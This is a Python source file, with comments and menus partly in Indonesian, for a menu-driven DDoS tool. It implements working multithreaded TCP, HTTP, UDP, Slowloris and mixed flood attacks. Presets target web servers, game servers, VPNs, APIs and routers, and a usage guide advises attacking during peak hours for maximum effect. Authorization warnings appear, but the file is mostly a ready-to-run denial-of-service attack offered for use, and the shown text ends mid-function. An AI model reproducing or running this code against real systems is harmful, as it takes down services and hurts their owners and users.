#!/usr/bin/env python3
#Tools ini adalah versi awal, jangan lupa donate agar saya semangat untukk membuat versi lanjutannya 🔥
#Gunakan dengan bijak, author tidak bertanggung jawab jika terjadi sesuatu! PASTIKAN ANDA PUNYA IZIN UNTUK MELAKUKAN TESTING INI!!

"""
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║  ██████╗ ██████╗  ██████╗ ███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗ ║
║  ██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║ ║
║  ██║  ██║██║  ██║██║   ██║███████╗    ███████╗██║     ███████║██╔██╗ ██║ ║
║  ██║  ██║██║  ██║██║   ██║╚════██║    ╚════██║██║     ██╔══██║██║╚██╗██║ ║
║  ██████╔╝██████╔╝╚██████╔╝███████║    ███████║╚██████╗██║  ██║██║ ╚████║ ║
║  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ║
║                                                                           ║
║                ⚡ ULTIMATE DDOS STRESS TESTER v1.0 ⚡                     ║
║           Advanced Features + Multi-Vector Attack System                 ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

import socket
import threading
import random
import time
import sys
import os
import struct
import ssl
import json
from urllib.parse import quote

# Simple color class
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BRIGHT = '\033[1m'
    DIM = '\033[2m'

class DDoSOptimizer:
    """Optimizer untuk menghitung requirements attack"""
    
    @staticmethod
    def get_target_preset(target_type):
        """Dapatkan preset untuk jenis target tertentu"""
        presets = {
            "webserver": {
                "name": "🌐 Web Server (Apache/Nginx)",
                "threads": 2000,
                "duration": 300,  # 5 menit
                "method": "http",
                "requests_needed": 50000,
                "bandwidth_mbps": 100,
                "success_rate": 85,
                "description": "Layer 7 HTTP flood untuk exhaust connection pool"
            },
            "gameserver": {
                "name": "🎮 Game Server (Minecraft/CSGO)",
                "threads": 5000,
                "duration": 180,  # 3 menit
                "method": "udp",
                "packets_needed": 1000000,
                "bandwidth_mbps": 150,
                "success_rate": 90,
                "description": "UDP flood dengan packet kecil & cepat"
            },
            "vpn": {
                "name": "🔒 VPN/Proxy Server",
                "threads": 3000,
                "duration": 480,  # 8 menit
                "method": "slowloris",
                "connections_needed": 10000,
                "bandwidth_mbps": 80,
                "success_rate": 75,
                "description": "Slowloris untuk hold connections"
            },
            "api": {
                "name": "📡 API Server (REST/GraphQL)",
                "threads": 1500,
                "duration": 420,  # 7 menit
                "method": "http",
                "requests_needed": 30000,
                "bandwidth_mbps": 120,
                "success_rate": 80,
                "description": "HTTP POST/PUT dengan payload JSON besar"
            },
            "router": {
                "name": "🛜 Router/Network Device",
                "threads": 10000,
                "duration": 240,  # 4 menit
                "method": "mixed",
                "packets_needed": 2000000,
                "bandwidth_mbps": 200,
                "success_rate": 95,
                "description": "Mixed attack untuk saturate bandwidth"
            }
        }
        return presets.get(target_type, presets["webserver"])
    
    @staticmethod
    def calculate_custom(target_ip, target_port, available_bandwidth=100, max_threads=5000):
        """Hitung parameters custom berdasarkan target"""
        # Simple heuristic calculation
        base_threads = min(available_bandwidth * 10, max_threads)
        duration = max(180, 50000 // base_threads)  # Minimal 3 menit
        
        return {
            "threads": base_threads,
            "duration": duration,
            "estimated_requests": base_threads * duration * 0.8,
            "estimated_bandwidth": available_bandwidth,
            "estimated_time_down": duration * 0.7  # 70% dari duration
        }

class UltimateDDoSAttack:
    def __init__(self):
        self.target_ip = ""
        self.target_port = 80
        self.num_threads = 1000
        self.attack_time = 300
        self.attack_running = False
        self.packets_sent = 0
        self.successful_connections = 0
        self.start_time = 0
        self.attack_method = "http"
        self.user_agents = []
        self.lock = threading.Lock()
        self.optimizer = DDoSOptimizer()
        
    def print_banner(self):
        banner = f"""
{Colors.CYAN}{Colors.BRIGHT}
╔═══════════════════════════════════════════════════════════════════════════╗
║                            Author:  RUYY                                  ║
║                    ⚡      DDOS SCAN v1.0      ⚡                         ║
║     Jangan Gunakan Untuk Hal Yang Ilegal, Author Tidak Tanggung Jawab     ║
╚═══════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
        """
        print(banner)
        print(f"{Colors.RED}{'═' * 75}{Colors.RESET}")
        print(f"{Colors.WHITE}{Colors.BRIGHT}🎯 Tools ini adalah versi awal, jangan lupa donate agar saya semangat 🔥 {Colors.RESET}")
        print(f"{Colors.RED}⚠  WARNING: FOR AUTHORIZED TESTING ONLY! ILLEGAL USE = PRISON TIME! ⚠{Colors.RESET}")
        print(f"{Colors.RED}{'═' * 75}{Colors.RESET}")

    def load_config(self):
        """Load configuration"""
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "curl/7.68.0",
            "python-requests/2.31.0"
        ]

    # ===================== ATTACK METHODS =====================

    def attack_tcp_flood(self):
        """TCP Flood Attack"""
        while self.attack_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_ip, self.target_port))
                
                payload = os.urandom(random.randint(500, 1500))
                sock.send(payload)
                
                for _ in range(random.randint(5, 15)):
                    if not self.attack_running:
                        break
                    sock.send(os.urandom(random.randint(100, 500)))
                    time.sleep(0.1)
                
                sock.close()
                
                with self.lock:
                    self.packets_sent += 1
                    self.successful_connections += 1
                    
            except:
                with self.lock:
                    self.packets_sent += 1
            
            time.sleep(random.uniform(0.01, 0.1))

    def attack_http_flood(self):
        """HTTP Flood Attack"""
        paths = ['/', '/index.html', '/wp-login.php', '/api/v1/test']
        
        while self.attack_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                
                if self.target_port == 443:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.target_ip)
                
                sock.connect((self.target_ip, self.target_port))
                
                for _ in range(random.randint(10, 50)):
                    if not self.attack_running:
                        break
                    
                    path = random.choice(paths)
                    user_agent = random.choice(self.user_agents)
                    
                    request = f"GET {path} HTTP/1.1\r\n"
                    request += f"Host: {self.target_ip}\r\n"
                    request += f"User-Agent: {user_agent}\r\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    request += "Accept-Language: en-US,en;q=0.5\r\n"
                    request += "Accept-Encoding: gzip, deflate\r\n"
                    request += "Connection: keep-alive\r\n"
                    request += "Cache-Control: no-cache\r\n"
                    request += "\r\n"
                    
                    sock.send(request.encode())
                    
                    with self.lock:
                        self.packets_sent += 1
                    
                    time.sleep(random.uniform(0.01, 0.1))
                
                sock.close()
                
                with self.lock:
                    self.successful_connections += 1
                    
            except:
                with self.lock:
                    self.packets_sent += 1
            
            time.sleep(0.05)

    def attack_udp_flood(self):
        """UDP Flood Attack"""
        while self.attack_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                for _ in range(random.randint(10, 100)):
                    if not self.attack_running:
                        break
                    
                    payload_size = random.randint(500, 1400)
                    payload = os.urandom(payload_size)
                    
                    sock.sendto(payload, (self.target_ip, self.target_port))
                    
                    with self.lock:
                        self.packets_sent += 1
                
                sock.close()
                
            except:
                with self.lock:
                    self.packets_sent += 1
            
            time.sleep(0.01)

    def attack_slowloris(self):
        """Slowloris Attack"""
        while self.attack_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target_ip, self.target_port))
                
                sock.send(f"GET /{random.randint(1, 9999)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {self.target_ip}\r\n".encode())
                sock.send("User-Agent: Mozilla/5.0\r\n".encode())
                sock.send("Content-Length: 42\r\n".encode())
                
                with self.lock:
                    self.packets_sent += 1
                    self.successful_connections += 1
                
                for _ in range(50):
                    if not self.attack_running:
                        break
                    try:
                        sock.send(f"X-{random.randint(1, 9999)}: {random.randint(1, 9999)}\r\n".encode())
                        time.sleep(random.uniform(10, 30))
                    except:
                        break
                
                sock.close()
                
            except:
                with self.lock:
                    self.packets_sent += 1
            
            time.sleep(0.1)

    def attack_mixed(self):
        """Mixed attack"""
        attacks = [self.attack_tcp_flood, self.attack_http_flood, 
                  self.attack_udp_flood, self.attack_slowloris]
        
        while self.attack_running:
            attack_func = random.choice(attacks)
            try:
                attack_func()
            except:
                pass
            time.sleep(random.uniform(0.01, 0.1))

    # ===================== MENU & INTERFACE =====================

    def show_preset_menu(self):
        """Tampilkan menu preset target"""
        print(f"\n{Colors.CYAN}{'═' * 75}{Colors.RESET}")
        print(f"{Colors.WHITE}{Colors.BRIGHT}🎯 SELECT TARGET PRESET{Colors.RESET}")
        print(f"{Colors.CYAN}{'═' * 75}{Colors.RESET}")
        
        presets = [
            ("1", "webserver", "🌐 Web Server (Apache/Nginx)"),
            ("2", "gameserver", "🎮 Game Server (Minecraft/CSGO)"),
            ("3", "vpn", "🔒 VPN/Proxy Server"),
            ("4", "api", "📡 API Server (REST/GraphQL)"),
            ("5", "router", "🛜 Router/Network Device"),
            ("6", "custom", "🔧 Custom Parameters"),
            ("7", "back", "↩ Back to Main Menu")
        ]
        
        for num, preset, name in presets:
            print(f"{Colors.YELLOW}[{num}] {name}{Colors.RESET}")
        
        print(f"{Colors.CYAN}{'═' * 75}{Colors.RESET}")
        
        choice = input(f"{Colors.GREEN}Select preset (1-7): {Colors.RESET}").strip()
        
        if choice == "7":
            return None
        
        preset_map = {
            "1": "webserver", "2": "gameserver", "3": "vpn",
            "4": "api", "5": "router", "6": "custom"
        }
        
        selected = preset_map.get(choice)
        
        if selected == "custom":
            return self.get_custom_parameters()
        elif selected:
            preset = self.optimizer.get_target_preset(selected)
            self.show_preset_details(preset)
            
            confirm = input(f"\n{Colors.YELLOW}Use this preset? (y/n): {Colors.RESET}").lower()
            if confirm == 'y':
                return preset
        
        return None

    def show_preset_details(self, preset):
        """Tampilkan detail preset"""
        print(f"\n{Colors.GREEN}{'═' * 75}{Colors.RESET}")
        print(f"{Colors.WHITE}{Colors.BRIGHT}📊 PRESET DETAILS: {preset['name']}{Colors.RESET}")
        print(f"{Colors.GREEN}{'═' * 75}{Colors.RESET}")
        
        print(f"{Colors.CYAN}Description:{Colors.RESET} {Colors.WHITE}{preset['description']}{Colors.RESET}")
        print(f"{Colors.CYAN}Recommended Threads:{Colors.RESET} {Colors.RED}{preset['threads']}{Colors.RESET}")
        print(f"{Colors.CYAN}Attack Duration:{Colors.RESET} {Colors.YELLOW}{preset['duration']} seconds ({preset['duration']/60:.1f} minutes){Colors.RESET}")
        print(f"{Colors.CYAN}Attack Method:{Colors.RESET} {Colors.MAGENTA}{preset['method'].upper()}{Colors.RESET}")
        
        if 'requests_needed' in preset:
            print(f"{Colors.CYAN}Requests Needed:{Colors.RESET} {Colors.WHITE}{preset['requests_needed']:,}{Colors.RESET}")
        if 'packets_needed' in preset:
            print(f"{Colors.CYAN}Packets Needed:{Colors.RESET} {Colors.WHITE}{preset['packets_needed']:,}{Colors.RESET}")
        if 'connections_needed' in preset:
            print(f"{Colors.CYAN}Connections Needed:{Colors.RESET} {Colors.WHITE}{preset['connections_needed']:,}{Colors.RESET}")
        
        print(f"{Colors.CYAN}Estimated Bandwidth:{Colors.RESET} {Colors.RED}{preset['bandwidth_mbps']} Mbps{Colors.RESET}")
        print(f"{Colors.CYAN}Success Rate:{Colors.RESET} {Colors.GREEN}{preset['success_rate']}%{Colors.RESET}")
        
        # Calculate metrics
        if preset['method'] == 'http':
            req_per_sec = preset['requests_needed'] / preset['duration']
            print(f"{Colors.CYAN}Required Rate:{Colors.RESET} {Colors.RED}{req_per_sec:.1f} requests/second{Colors.RESET}")
        elif preset['method'] == 'udp':
            packets_per_sec = preset['packets_needed'] / preset['duration']
            print(f"{Colors.CYAN}Required Rate:{Colors.RESET} {Colors.RED}{packets_per_sec:.1f} packets/second{Colors.RESET}")
        
        print(f"{Colors.GREEN}{'═' * 75}{Colors.RESET}")

    def get_custom_parameters(self):
        """Dapatkan parameters custom dari user"""
        print(f"\n{Colors.CYAN}{'═' * 75}{Colors.RESET}")
        print(f"{Colors.WHITE}{Colors.BRIGHT}🔧 CUSTOM PARAMETERS{Colors.RESET}")
        print(f"{Colors.CYAN}{'═' * 75}{Colors.RESET}")
        
        try:
            # Get target info
            self.target_ip = input(f"{Colors.YELLOW}Target IP/Hostname: {Colors.RESET}").strip()
            
            port_input = input(f"{Colors.YELLOW}Target Port (default 80): {Colors.RESET}").strip()
            if port_input:
                self.target_port = int(port_input)
            
            # Get attack parameters
            threads_input = input(f"{Colors.YELLOW}Threads (1-10000, default 1000): {Colors.RESET}").strip()
            if threads_input:
                self.num_threads = int(threads_input)
                self.num_threads = max(1, min(10000, self.num_threads))
            else:
                self.num_threads = 1000
            
            duration_input = input(f"{Colors.YELLOW}Duration in seconds (10-3600, default 300): {Colors.RESET}").strip()
            if duration_input:
                self.attack_time = int(duration_input)
                self.attack_time = max(10, min(3600, self.attack_time))
            else:
                self.attack_time = 300
            
            # Select method
            print(f"\n{Colors.CYAN}Attack Methods:{Colors.RESET}")
            print(f"{Colors.YELLOW}[1]{Colors.RESET} TCP Flood (Layer 4)")
            print(f"{Colors.YELLOW}[2]{Colors.RESET} HTTP Flood (Layer 7)")
            print(f"{Colors.YELLOW}[3]{Colors.RESET} UDP Flood (High bandwidth)")
            print(f"{Colors.YELLOW}[4]{Colors.RESET} Slowloris (Connection exhaustion)")
            print(f"{Colors.YELLOW}[5]{Colors.RESET} Mixed (All methods)")
            
            method_choice = input(f"{Colors.YELLOW}Select method (1-5, default 2): {Colors.RESET}").strip()
            methods = {1: "tcp", 2: "http", 3: "udp", 4: "slowloris", 5: "mixed"}
            
            if method_choice and method_choice.isdigit():
                self.attack_method = methods.get(int(method_choice), "http")
            else:
                self.attack_method = "http"
            
            # Calculate estimated results
            estimated_requests = self.num_threads * self.attack_time * 0.8
            estimated_bandwidth = min(self.num_threads * 0.01, 1000)  # Mbps
            
            print(f"\n{Colors.GREEN}{'═' * 75}{Colors.RESET}")
            print(f"{Colors.WHITE}{Colors.BRIGHT}📊 CUSTOM CONFIGURATION SUMMARY{Colors.RESET}")
            print(f"{Colors.GREEN}{'═' * 75}{Colors.RESET}")
            
            print(f"{Colors.CYAN}Target:{Colors.RESET} {Colors.WHITE}{self.target_ip}:{self.target_port}{Colors.RESET}")
            print(f"{Colors.CYAN}Threads:{Colors.RESET} {Colors.RED}{self.num_threads}{Colors.RESET}")
            print(f"{Colors.CYAN}Duration:{Colors.RESET} {Colors.YELLOW}{self.attack_time}s ({self.attack_time/60:.1f} minutes){Colors.RESET}")
            print(f"{Colors.CYAN}Method:{Colors.RESET} {Colors.MAGENTA}{self.attack_method.upper()}{Colors.RESET}")
            print(f"{Colors.CYAN}Estimated Requests:{Colors.RESET} {Colors.WHITE}{estimated_requests:,.0f}{Colors.RESET}")
            print(f"{Colors.CYAN}Estimated Bandwidth:{Colors.RESET} {Colors.RED}{estimated_bandwidth:.1f} Mbps{Colors.RESET}")
            
            if self.attack_method == "http":
                req_per_sec = estimated_requests / self.attack_time
                print(f"{Colors.CYAN}Required Rate:{Colors.RESET} {Colors.RED}{req_per_sec:.1f} requests/second{Colors.RESET}")
            
            print(f"{Colors.GREEN}{'═' * 75}{Colors.RESET}")
            
            confirm = input(f"\n{Colors.YELLOW}Start attack with these parameters? (y/n): {Colors.RESET}").lower()
            
            if confirm == 'y':
                return {
                    "name": f"Custom: {self.target_ip}:{self.target_port}",
                    "threads": self.num_threads,
                    "duration": self.attack_time,
                    "method": self.attack_method,
                    "description": "Custom attack configuration"
                }
            else:
                return None
                
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
            return None

    def show_usage_guide(self):
        """Tampilkan panduan penggunaan"""
        print(f"\n{Colors.CYAN}{'═' * 75}{Colors.RESET}")
        print(f"{Colors.WHITE}{Colors.BRIGHT}📖 USAGE GUIDE & RECOMMENDATIONS{Colors.RESET}")
        print(f"{Colors.CYAN}{'═' * 75}{Colors.RESET}")
        
        guides = [
            ("🌐 WEB SERVER", """
• Target: Apache, Nginx, IIS, Lighttpd
• Threads: 2000-3000
• Duration: 5-10 minutes
• Method: HTTP Flood
• Requests Needed: 50,000-100,000
• Success Rate: 85-90%
            """),
            
            ("🎮 GAME SERVER", """
• Target: Minecraft, CS:GO, Rust, ARK
• Threads: 5000-8000  
• Duration: 3-5 minutes
• Method: UDP Flood
• Packets Needed: 1,000,000-2,000,000
• Success Rate: 90-95%
            """),
            
            ("🔒 VPN/PROXY", """
• Target: OpenVPN, WireGuard, Shadowsocks
• Threads: 3000-4000
• Duration: 8-12 minutes
• Method: Slowloris + TCP Flood
• Connections: 10,000-20,000
• Success Rate: 75-85%
            """),
            
            ("⚡ GENERAL TIPS", """
1. Use VPS with >100Mbps bandwidth
2. Monitor target status in real-time
3. Start with lower threads, increase gradually
4. Combine multiple attack methods
5. Attack during peak hours for maximum effect
6. Ensure you have proper authorization!
            """)
        ]
        
        for title, content in guides:
            print(f"\n{Colors.YELLOW}{Colors.BRIGHT}{title}{Colors.RESET}")
            print(f"{Colors.WHITE}{content}{Colors.RESET}")
        
        print(f"{Colors.CYAN}{'═' * 75}{Colors.RESET}")
        input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.RESET}")

    def show_quick_calculator(self):
        """Tampilkan kalkulator cepat"""
        print(f"\n{Colors.CYAN}{'═' * 75}{Colors.RESET}")
        print(f"{Colors.WHITE}{Colors.BRIGHT}🧮 QUICK CALCULATOR{Colors.RESET}")
        print(f"{Colors.CYAN}{'═' * 75}{Colors.RESET}")
        
        try:
            target_ip = input(f"{Colors.YELLOW}Target IP (for calculation): {Colors.RESET}").strip()
            available_bandwidth = input(f"{Colors.YELLOW}Your available bandwidth (Mbps, default 100): {Colors.RESET}").strip()
            
            if available_bandwidth:
                bandwidth = float(available_bandwidth)
            else:
                bandwidth = 100
            
            max_threads = input(f"{Colors.YELLOW}Max threads you can run (default 5000): {Colors.RESET}").strip()
            if max_threads:
                max_t = int(max_threads)
            else:
                max_t = 5000
            
            # Calculate
            result = self.optimizer.calculate_custom(target_ip, 80, bandwidth, max_t)
            
            print(f"\n{Colors.GREEN}{'═' * 75}{Colors.RESET}")
            print(f"{Colors.WHITE}{Colors.BRIGHT}📊 CALCULATION RESULTS{Colors.RESET}")
            print(f"{Colors.GREEN}{'═' * 75}{Colors.RESET}")
            
            print(f"{Colors.CYAN}Target:{Colors.RESET} {Colors.WHITE}{target_ip}{Colors.RESET}")
            print(f"{Colors.CYAN}Your Bandwidth:{Colors.RESET} {Colors.RED}{bandwidth} Mbps{Colors.RESET}")
            print(f"{Colors.CYAN}Recommended Threads:{Colors.RESET} {Colors.RED}{result['threads']}{Colors.RESET}")
            print(f"{Colors.CYAN}Recommended Duration:{Colors.RESET} {Colors.YELLOW}{result['duration']}s ({result['duration']/60:.1f}min){Colors.RESET}")
            print(f"{Colors.CYAN}Estimated Requests:{Colors.RESET} {Colors.WHITE}{result['estimated_requests']:,.0f}{Colors.RESET}")
            print(f"{Colors.CYAN}Estimated Time to Down:{Colors.RESET} {Colors.RED}{result['estimated_time_down']:.1f}s{Colors.RESET}")
            
            # Additional metrics
            req_per_sec = result['estimated_requests'] / result['duration']
            print(f"{Colors.CYAN}Required Rate:{Colors.RESET} {Colors.MAGENTA}{req_per_sec:.1f} requests/second{Colors.RESET}")
            
            success_chance = min(95, (bandwidth / 2) + 50)
            print(f"{Colors.CYAN}Success Chance:{Colors.RESET} {Colors.GREEN}{success_chance:.0f}%{Colors.RESET}")
            
            print(f"{Colors.GREEN}{'═' * 75}{Colors.RESET}")
            
            use_calc = input(f"\n{Colors.YELLOW}Use these calculated parameters? (y/n): {Colors.RESET}").lower()
            
            if use_calc == 'y':
                self.num_threads = result['threads']
                self.attack_time = result['duration']
                self.target_ip = target_ip
                
                # Auto-select method based on parameters
                if result['threads'] > 3000:
                    self.attack_method = "mixed"
                else:
                    self.attack_method = "http"
                
                return {
                    "name": f"Calculated: {target_ip}",
                    "threads": self.num_threads,
                    "duration": self.attack_time,
                    "method": self.attack_method,
                    "description": "Auto-calculated parameters"
                }
                
        except Exception as e:
            print(f"{Colors.RED}[!] Calculation error: {e}{Colors.RESET}")
        
        return None

    def main_menu(self):
        """Menu utama dengan format pemakaian lengkap"""
        while True:
            os.system('clear' if os.name != 'nt' else 'cls')
            self.print_banner()
            
            print(f"\n{Colors.CYAN}{'═' * 75}{Colors.RESET}")
            print(f"{Colors.WHITE}{Colors.BRIGHT}📋 MAIN MENU - SELECT OPTION{Colors.RESET}")
            print(f"{Colors.CYAN}{'═' * 75}{Colors.RESET}")
            
            menu_options = [
                ("1", "🎯 Start Attack (Target Preset)", "Pilih preset target yang umum"),
                ("2", "🔧 Custom Attack", "Atur parameters manual"),
                ("3", "🧮 Quick Calculator", "Hitung kebutuhan berdasarkan bandwidth"),
                ("4", "📖 Usage Guide", "Panduan & rekomendasi"),
                ("5", "⚡ Direct Attack", "Langsung attack dengan parameter cepat"),
                ("6", "🚪 Exit", "Keluar dari program")
            ]
            
            for num, title, desc in menu_options:
                print(f"{Colors.YELLOW}[{num}] {title:<25} {Colors.DIM}{desc}{Colors.RESET}")
            
            print(f"{Colors.CYAN}{'═' * 75}{Colors.RESET}")
            
            choice = input(f"\n{Colors.GREEN}Select option (1-6): {Colors.RESET}").strip()
            
            if choice == "1":
                # Target Preset
                preset = self.show_preset_menu()
                if preset:
                    self.num_threads = preset['threads']
                    self.attack_time = preset['duration']
                    self.attack_method = preset['method']
                    self.start_attack_flow()
            
            elif choice == "2":
                # Custom Attack
                preset = self.get_custom_parameters()
                if preset:
                    self.num_threads = preset['threads']
                    self.attack_time = preset['duration']
                    self.attack_method = preset['method']
                    self.start_attack_flow()
            
            elif choice == "3":
                # Quick Calculator
                preset = self.show_quick_calculator()
                if preset:
                    self.num_threads = preset['threads']
                    self.attack_time = preset['duration']
                    self.attack_method = preset['method']
                    self.start_attack_flow()
            
            elif choice == "4":
                # Usage Guide
                self.show_usage_guide()
            
            elif choice == "5":
                # Direct Attack
                self.direct_attack()
            
            elif choice == "6":
                print(f"\n{Colors.GREEN}[+] Exiting... Stay safe!{Colors.RESET}")
                break
            
            else:
                print(f"{Colors.RED}[!] Invalid option{Colors.RESET}")
                time.sleep(1)

    def direct_attack(self):
        """Attack langsung dengan parameter minimal"""
        print(f"\n{Colors.CYAN}{'═' * 75}{Colors.RESET}")
        print(f"{Colors.WHITE}{Colors.BRIGHT}⚡ DIRECT ATTACK (Quick Start){Colors.RESET}")
        print(f"{Colors.CYAN}{'═' * 75}{Colors.RESET}")
        
        try:
            self.target_ip = input(f"{Colors.YELLOW}Target IP: {Colors.RESET}").strip()
            
            # Default parameters for quick attack
            self.num_threads = 2000
            self.attack_time = 300  # 5 minutes
            self.attack_method = "http"
            self.target_port = 80
            
            print(f"\n{Colors.YELLOW}Using default parameters:{Colors.RESET}")
            print(f"• Threads: {self.num_threads}")
            print(f"• Duration: {self.attack_time}s ({self.attack_time/60:.1f}min)")
            print(f"• Method: {self.attack_method.upper()}")
            print(f"• Port: {self.target_port}")
            
            confirm = input(f"\n{Colors.YELLOW}Start attack? (y/n): {Colors.RESET}").lower()
            if confirm == 'y':
                self.start_attack_flow()
                
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")

    def start_attack_flow(self):
        """Start attack flow"""
        self.load_config()
        
        # Final confirmation
        print(f"\n{Colors.RED}{'═' * 75}{Colors.RESET}")
        print(f"{Colors.RED}{Colors.BRIGHT}⚖️  FINAL CONFIRMATION{Colors.RESET}")
        print(f"{Colors.RED}{'═' * 75}{Colors.RESET}")
        
        print(f"{Colors.YELLOW}Target:{Colors.RESET} {Colors.WHITE}{self.target_ip}:{self.target_port}{Colors.RESET}")
        print(f"{Colors.YELLOW}Threads:{Colors.RESET} {Colors.RED}{self.num_threads}{Colors.RESET}")
        print(f"{Colors.YELLOW}Duration:{Colors.RESET} {Colors.YELLOW}{self.attack_time}s ({self.attack_time/60:.1f}min){Colors.RESET}")
        print(f"{Colors.YELLOW}Method:{Colors.RESET} {Colors.MAGENTA}{self.attack_method.upper()}{Colors.RESET}")
        
        estimated_requests = self.num_threads * self.attack_time * 0.8
        print(f"{Colors.YELLOW}Estimated Requests:{Colors.RESET} {Colors.WHITE}{estimated_requests:,.0f}{Colors.RESET}")
        
        print(f"\n{Colors.RED}⚠  ILLEGAL USE = FINES + PRISON TIME!{Colors.RESET}")
        print(f"{Colors.YELLOW}You must have WRITTEN PERMISSION from target owner!{Colors.RESET}")
        
        confirm = input(f"\n{Colors.RED}Type 'CONFIRM' to launch attack: {Colors.RESET}").strip()
        
        if confirm.upper() == "CONFIRM":
            self.start_attack()
        else:
            print(f"{Colors.YELLOW}[!] Attack cancelled{Colors.RESET}")

    # ===================== ATTACK EXECUTION =====================
    def start_attack(self):
        """Start the attack"""
        print(f"\n{Colors.RED}{'═' * 75}{Colors.RESET}")
        print(f"{Colors.RED}{Colors.BRIGHT}🚀 LAUNCHING ATTACK{Colors.RESET}")
        print(f"{Colors.RED}{'═' * 75}{Colors.RESET}")
        
        print(f"{Colors.CYAN}[*] Initializing attack vectors...{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Target: {self.target_ip}:{self.target_port}{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Method: {self.attack_method.upper()}{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Threads: {self.num_threads}{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Duration: {self.attack_time}s ({self.attack_time/60:.1f} minutes){Colors.RESET}")
        
        # Initialize counters
        self.attack_running = True
        self.packets_sent = 0
        self.successful_connections = 0
        self.start_time = time.time()
        
        # Start threads
        threads = []
        for i in range(self.num_threads):
            try:
                t = threading.Thread(target=self.get_attack_method(), daemon=True)
                t.start()
                threads.append(t)
                if i % 100 == 0:
                    print(f"{Colors.GREEN}[+] Started {i}/{self.num_threads} threads...{Colors.RESET}", end='\r')
            except:
                pass
        
        print(f"{Colors.GREEN}[✓] All {self.num_threads} threads started!{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Attack will run for {self.attack_time} seconds...{Colors.RESET}")
        
        # Start statistics thread
        stats_thread = threading.Thread(target=self.show_stats, daemon=True)
        stats_thread.start()
        
        # Attack timer
        time.sleep(self.attack_time)
        self.attack_running = False
        
        # Wait for threads to finish
        time.sleep(2)
        
        # Show final results
        self.show_final_stats()

    def get_attack_method(self):
        """Get the attack method function"""
        methods = {
            "tcp": self.attack_tcp_flood,
            "http": self.attack_http_flood,
            "udp": self.attack_udp_flood,
            "slowloris": self.attack_slowloris,
            "mixed": self.attack_mixed
        }
        return methods.get(self.attack_method, self.attack_http_flood)

    def show_stats(self):
        """Show real-time statistics"""
        print(f"\n{Colors.BLUE}{'═' * 75}{Colors.RESET}")
        print(f"{Colors.WHITE}{Colors.BRIGHT}📊 REAL-TIME STATISTICS{Colors.RESET}")
        print(f"{Colors.BLUE}{'═' * 75}{Colors.RESET}")
        
        while self.attack_running:
            elapsed = time.time() - self.start_time
            minutes = int(elapsed // 60)
            seconds = int(elapsed % 60)
            
            with self.lock:
                packets = self.packets_sent
                connections = self.successful_connections
            
            # Calculate rates
            if elapsed > 0:
                packets_per_sec = packets / elapsed
                connections_per_sec = connections / elapsed
            else:
                packets_per_sec = 0
                connections_per_sec = 0
            
            # Calculate progress
            progress = min(100, (elapsed / self.attack_time) * 100)
            
            # Clear lines for updating
            print(f"\r{Colors.YELLOW}⏱️  Time: {minutes:02d}:{seconds:02d} / {int(self.attack_time//60):02d}:{int(self.attack_time%60):02d} "
                  f"[{progress:.1f}%]{Colors.RESET}", end=' ')
            print(f"{Colors.GREEN}📦 Packets: {packets:,}{Colors.RESET}", end=' ')
            print(f"{Colors.CYAN}🔗 Connections: {connections:,}{Colors.RESET}", end=' ')
            print(f"{Colors.MAGENTA}⚡ Rate: {packets_per_sec:.0f}/s{Colors.RESET}", end='')
            
            # Show attack effectiveness
            if elapsed > 10:  # After 10 seconds
                effectiveness = min(100, (connections / max(1, packets)) * 100)
                if effectiveness > 50:
                    status = f"{Colors.GREEN}🟢 HIGH{Colors.RESET}"
                elif effectiveness > 25:
                    status = f"{Colors.YELLOW}🟡 MEDIUM{Colors.RESET}"
                else:
                    status = f"{Colors.RED}🔴 LOW{Colors.RESET}"
                print(f" {Colors.WHITE}Effectiveness: {status}{Colors.RESET}", end='')
            
            time.sleep(1)
    
    def show_final_stats(self):
        """Show final statistics after attack"""
        elapsed = time.time() - self.start_time
        
        print(f"\n\n{Colors.GREEN}{'═' * 75}{Colors.RESET}")
        print(f"{Colors.WHITE}{Colors.BRIGHT}📈 ATTACK COMPLETE - FINAL STATISTICS{Colors.RESET}")
        print(f"{Colors.GREEN}{'═' * 75}{Colors.RESET}")
        
        with self.lock:
            packets = self.packets_sent
            connections = self.successful_connections
        
        packets_per_sec = packets / elapsed if elapsed > 0 else 0
        connections_per_sec = connections / elapsed if elapsed > 0 else 0
        success_rate = (connections / max(1, packets)) * 100
        
        print(f"{Colors.CYAN}🎯 Target:{Colors.RESET} {Colors.WHITE}{self.target_ip}:{self.target_port}{Colors.RESET}")
